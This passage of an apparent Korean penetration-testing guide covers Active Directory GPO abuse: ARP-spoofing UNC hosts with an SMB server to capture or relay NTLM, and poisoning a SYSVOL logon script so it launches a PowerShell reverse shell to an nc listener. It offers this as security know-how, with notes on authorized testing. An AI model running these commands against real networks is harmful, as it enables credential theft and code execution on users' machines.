- 오래된 `.aas` 광고 파일이 `SYSVOL`에 남아 있을 수 있으므로, 이 방법에 의존하기 전에 배포가 여전히 활성 상태로 보이는지 확인합니다.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### 드라이브 매핑 UNC 하이재킹 -> NTLM 캡처 / WebDAV 릴레이

`Drives.xml`의 GPP 드라이브 매핑으로 인해 사용자는 로그온하거나 다시 연결할 때 설정된 UNC 경로에 인증합니다. 참조된 호스트를 위장하면 **NetNTLMv2**를 캡처할 수 있습니다. SMB 연결이 실패하도록 의도적으로 설정하면 Windows가 **WebDAV**를 통해 재시도하면서 **HTTP를 통한 NTLM**을 전송할 수 있습니다. 이는 **LDAP(S)**, **AD CS** 또는 **SMB**로 릴레이하기에 훨씬 유연합니다.

#### 로그온/시작 스크립트 UNC 하이재킹

동일한 방식은 `SYSVOL`에서 발견한 UNC 호스팅 스크립트에도 적용됩니다.

- **로그온 스크립트**는 보통 **사용자** 컨텍스트에서 실행됩니다.
- **시작 스크립트**는 보통 **컴퓨터 / SYSTEM** 컨텍스트에서 실행됩니다.

스크립트 경로가 위장할 수 있는 호스트를 가리키면 UNC 호스트를 다른 곳으로 연결하고 예상된 위치에서 대체 스크립트 콘텐츠를 제공하세요.

## SYSVOL/NETLOGON 로그온 스크립트 포이즈닝

`\\<dc>\SYSVOL\<domain>\scripts\` 또는 `\\<dc>\NETLOGON\` 아래의 쓰기 가능한 경로를 이용하면 GPO를 통해 사용자 로그온 시 실행되는 로그온 스크립트를 변조할 수 있습니다. 이를 통해 로그온하는 사용자의 보안 컨텍스트에서 코드를 실행할 수 있습니다.

### 로그온 스크립트 찾기
- 구성된 로그온 스크립트가 있는지 사용자 속성을 확인합니다:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- 도메인 공유 폴더를 크롤링해 스크립트에 대한 바로 가기나 참조를 찾습니다:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- `.lnk` 파일을 파싱해 SYSVOL/NETLOGON 내부를 가리키는 대상 경로를 확인합니다(유용한 DFIR 기법이며 GPO에 직접 접근할 수 없는 공격자에게도 유용합니다):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound는 사용자 객체에 `scriptPath` 로그온 스크립트 속성이 있으면 이를 표시합니다. GPO로 구성된 로그온 스크립트는 별도의 정책 참조이므로 해당 GPO도 검사하세요.

### 쓰기 권한 확인 (공유 목록을 그대로 믿지 마세요)
자동화 도구는 해당 스크립트의 NTFS ACL이 다르더라도 SYSVOL/NETLOGON을 읽기 전용으로 표시할 수 있습니다. 먼저 해당 파일과 상위 디렉터리를 읽기 전용으로 검사하세요. 일치하는 Allow ACE는 후보로 볼 수 있지만, 실제 SMB 및 NTFS 권한, Deny ACE, 현재 토큰이 모두 영향을 미칩니다:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

승인된 쓰기 테스트는 대상에 한정하고 되돌릴 수 있어야 하며, 원본 스크립트를 백업한 뒤 복원해야 합니다. 접근 권한을 테스트하려고 정상 작동 중인 logon script를 덮어쓰지 마세요. 쓰기가 성공하면 다음 사용자의 logon 시 실행될 수 있습니다.

### RCE를 위해 VBScript logon script에 poison 적용
업무 기능이 중단되지 않도록 기존 로직은 유지하면서 PowerShell reverse shell을 실행하는 명령을 추가합니다(revshells.com에서 생성):

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

호스트에서 수신 대기하고 다음 대화형 로그온을 기다립니다:

```bash
rlwrap -cAr nc -lnvp 443
```

Notes:
- 실행은 logging user의 토큰(SYSTEM 아님)으로 이루어집니다. 범위는 해당 스크립트를 적용하는 GPO link(OU, site, domain)입니다.
- 사용 후 원래 내용/타임스탬프를 복원하여 정리하세요.


## References

- [1] [Active Directory ACLs/ACEs 악용](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [권한 있는 계정 및 토큰 권한](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL 공격 경로 업데이트](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory에서 ACL을 이용한 권한 상승](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory 권한 및 권한 있는 계정 검색](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux에서 AD 속성/UAC 작업](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (그룹 멤버십)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL 악용, KeePassXC Argon2 크래킹, DPAPI 복호화를 통한 DC 관리자 권한 획득](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: 코드 실행 및 NTLM Relay를 위한 GPO UNC 경로 하이재킹](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM 릴레이 등을 통한 Active Directory GPO 악용](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory의 숨겨진 Organizational Units ACL 공격 벡터 악용](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [네트워크에서 정상적인 Active Directory 서비스를 시뮬레이션하기: GPO 악용 사례](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU 이동 및 상속된 ACL 악용](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
